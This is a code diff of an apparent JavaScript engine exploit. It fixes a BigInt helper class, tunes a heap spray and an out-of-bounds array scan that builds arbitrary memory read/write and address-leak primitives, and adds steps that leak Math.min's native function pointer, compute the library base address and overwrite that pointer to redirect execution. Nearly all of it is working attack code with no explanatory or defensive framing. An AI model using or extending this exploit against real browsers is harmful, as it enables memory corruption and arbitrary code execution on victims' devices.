@@ -133,55 +133,67 @@ class BigInt {
 	}
 
 	add(val) {
+		var res = new Uint8Array(this.buf.byteLength);
+
 		var c = 0; 
 		for (var i = 0; i < this.buf.byteLength; i++) {
 			var b = this.u8[i] + val.u8[i] + c;
 			c = b > 0xFF | 0;
-			this.u8[i] = b; 
+			res[i] = b; 
 		}
 		
-		return this;
+		return new BigInt(res);
 	}
 
 	sub(val) {
+		var res = new Uint8Array(this.buf.byteLength);
+
 		var c = 0; 
 		for (var i = 0; i < this.buf.byteLength; i++) {
 			var b = this.u8[i] - val.u8[i] - c;
 			c = b < 0 | 0;
-			this.u8[i] = b; 
+			res[i] = b; 
 		}
 
-		return this;
+		return new BigInt(res);
 	}
 
 	xor(val) {
+		var res = new Uint8Array(this.buf.byteLength);
+
 		for (var i = 0; i < this.buf.byteLength; i++) {
-			this.u8[i] ^= val.u8[i];
+			res[i] = this.u8[i] ^ val.u8[i];
 		}
 
-		return this;
+		return new BigInt(res);
 	}
 
 	and(val) {
+		var res = new Uint8Array(this.buf.byteLength);
+
 		for (var i = 0; i < this.buf.byteLength; i++) {
-			this.u8[i] &= val.u8[i];
+			res[i] = this.u8[i] & val.u8[i];
 		}
 
-		return this;
+		return new BigInt(res);
 	}
 
 	neg() {
+		var res = new Uint8Array(this.buf.byteLength);
+
 		for (var i = 0; i < this.buf.byteLength; i++) {
-			this.u8[i] = ~this.u8[i];
+			res[i] = ~this.u8[i];
 		}
 
-		return this.and(BigInt.One);
+		return new BigInt(res).and(BigInt.One);
 	}
 
 	shl(count) {
 		if (count < 0 || count > 64) {
 			throw new RangeError(`Shift ${count} bits out of range !!`);
 		}
+
+		var res = new Uint8Array(this.buf.byteLength);
 
 		var byte_count = Math.floor(count / 8);
 		var bit_count = count % 8;
@@ -195,16 +207,18 @@ class BigInt {
 				b = ((b << bit_count) | (p >> (8 - bit_count))) & 0xFF;
 			}
 
-			this.u8[i] = b;
+			res[i] = b;
 		}
 
-		return this;
+		return new BigInt(res);
 	}
 
 	shr(count) {
 		if (count < 0 || count > 64) {
 			throw new RangeError(`Shift ${count} bits out of range !!`);
 		}
+
+		var res = new Uint8Array(this.buf.byteLength);
 
 		var byte_count = Math.floor(count / 8);
 		var bit_count = count % 8;
@@ -218,10 +232,10 @@ class BigInt {
 				b = ((b >> bit_count) | (n << (8 - bit_count))) & 0xFF;
 			}
 
-			this.u8[i] = b;
+			res[i] = b;
 		}
 
-		return this;
+		return new BigInt(res);
 	}
 }
 
@@ -298,7 +312,7 @@ while (true) {
 	var prim_spray = [];
 
 	var prop = new BigInt(0, 0x13371337);
-	for (var i = 0; i < 0x200; i++)
+	for (var i = 0; i < 0x100; i++)
 	{
 	    prim_spray[i] = new Array(0x10);
 		prim_spray[i][0] = 13.37;
@@ -319,24 +333,23 @@ while (true) {
 	var marker = new BigInt(0x0, 0x1337);
 	for (var i = 0; i < 0x5000; i++)
 	{
-	    var lookup_idx = i;
-	    var old_val = oob_arr[lookup_idx];
+	    var old_val = oob_arr[i];
 
 	    if (old_val == undefined) {
 			continue;
 		}
 
-	    oob_arr[lookup_idx] = marker.d();
+	    oob_arr[i] = marker.d();
 
-	    for (var k = 0; k < 0x200; k++)
+	    for (var k = 0; k < 0x100; k++)
 	    {
 	        if(prim_spray[k].length > 0x10)
 	        {
 	            found_prim = true;
 	            leak_prim_idx = k;
-	            leak_double_idx = lookup_idx;
+	            leak_double_idx = i;
 
-	            oob_arr[lookup_idx] = old_val;
+	            oob_arr[i] = old_val;
 
 	            break;
 	        }
@@ -346,7 +359,7 @@ while (true) {
 			break;
 		}
 
-	    oob_arr[lookup_idx] = old_val;
+	    oob_arr[i] = old_val;
 	}
 
 	if (found_prim) {
@@ -372,7 +385,7 @@ while (true) {
 
 		var rw_target = {a: 0, b: 0, c: 0, d: 0};
 
-		rw_target.a = new BigInt(0x1602300, 0x84).d();
+		rw_target.a = new BigInt(0x1602300, 0xC4).d();
 		rw_target.b = 0;
 		rw_target.c = slave;
 		rw_target.d = 0x1337;
@@ -383,7 +396,7 @@ while (true) {
 
 		log(`rw_target_addr: ${rw_target_addr}`);
 
-		rw_target_addr.add(new BigInt(0, 0x10));
+		rw_target_addr = rw_target_addr.add(new BigInt(0, 0x10));
 
 		oob_arr[leak_double_idx+2] = rw_target_addr.d();
 
@@ -433,10 +446,10 @@ var prim = {
     leakval: function(jsval)
     {
         leak_target.a = jsval;
-        return prim.read8(new BigInt(leak_target_addr).add(new BigInt(0, 0x10)));
+        return prim.read8(leak_target_addr.add(new BigInt(0, 0x10)));
     }
 };
-
+/*
 var test = { 
 	a: 13.37
 }
@@ -447,7 +460,7 @@ log(`test.a: ${test.a}`);
 var addr = prim.leakval(test);
 log(`test addrof: ${addr}`);
 
-var a = new BigInt(addr).add(new BigInt(0, 0x10));
+var a = addr.add(new BigInt(0, 0x10));
 
 var val = prim.read8(a);
 log(`addrof(test)+0x10 read8: ${val}`);
@@ -460,5 +473,25 @@ prim.write8(a, val);
 val = prim.read8(a);
 log(`addrof(test)+0x10 read8: ${val}`);
 log(`addrof(test)+0x10 read8 double: ${val.d()}`);
+*/
+
+var math_min_addr = prim.leakval(Math.min);
+log(`addrof(Math.min): ${math_min_addr}`);
+
+var native_executable = prim.read8(math_min_addr.add(new BigInt(0, 0x18)));
+log(`native_executable: ${native_executable}`);
+
+var native_executable_function = prim.read8(native_executable.add(new BigInt(0, 0x40)));
+log(`native_executable_function: ${native_executable_function}`);
+
+var native_executable_constructor  = prim.read8(native_executable.add(new BigInt(0, 0x48)));
+log(`native_executable_constructor: ${native_executable_constructor}`);
+
+var base_addr = native_executable_function.sub(new BigInt(0, 0xC6380));
+log(`base_addr: ${base_addr}`);
+
+prim.write8(native_executable.add(new BigInt(0, 0x40)), new BigInt(0x41414141, 0x41414141));
+
+Math.min(BigInt.One.d());
 
 while(true) {}
